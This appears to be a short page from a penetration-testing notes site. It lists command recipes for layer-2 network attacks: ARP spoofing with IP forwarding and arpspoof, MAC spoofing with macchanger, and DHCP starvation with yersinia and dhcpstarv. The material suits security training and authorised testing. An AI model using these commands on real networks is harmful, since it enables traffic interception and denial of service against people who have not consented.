---
layout: default
title: Network Attacks
parent: Exploitation
nav_order: 1
---

# Network Attacks
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

### ARP Spoofing
`echo 1 > /proc/sys/net/ipv4/ip_forward` - enables IP forwarding   
`arpspoof -i <int> -t <target ip addr> -r <host to spoof i.e. gw>`  
`arpspoof -i <int> -r <host to spoof i.e. gw> -t <target ip addr>`  

### MAC Spoofing
`macchanger --show <int>` - shows current MACs set  
`macchanger -r <int>` - sets a random MAC on <int>  
 
### DHCP Starvation
`yersinia -G` - Starts Yersinia´s (Layer 2 attack framework) gui  
`dhcpstarv -i <int>` 
